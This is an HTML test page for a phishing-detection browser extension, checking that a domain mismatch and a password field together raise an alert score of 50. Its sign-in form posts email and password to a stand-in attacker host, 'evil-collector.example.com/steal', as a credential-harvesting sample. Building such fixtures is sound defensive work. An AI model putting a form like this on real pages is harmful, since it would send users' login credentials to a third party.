<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Test: Domain Mismatch Detection</title>
  <style>
    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; }
    .info { background: #fff3e0; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
    form { background: #f5f5f5; padding: 20px; border-radius: 8px; }
    input { display: block; margin: 10px 0; padding: 8px; width: 100%; box-sizing: border-box; }
  </style>
</head>
<body>
  <h1>Domain Mismatch Detection Test</h1>
  <div class="info">
    <strong>Expected:</strong> Extension should detect DOMAIN_MISMATCH signal (score +30)
    and PASSWORD_FIELD (score +20) = total 50 (danger level, ALERT triggered).
    The form action points to an external domain (evil-collector.example.com).
  </div>
  <form action="https://evil-collector.example.com/steal" method="POST">
    <label>Email</label>
    <input type="email" name="email" placeholder="you@example.com">
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter password">
    <button type="submit">Sign In</button>
  </form>
</body>
</html>
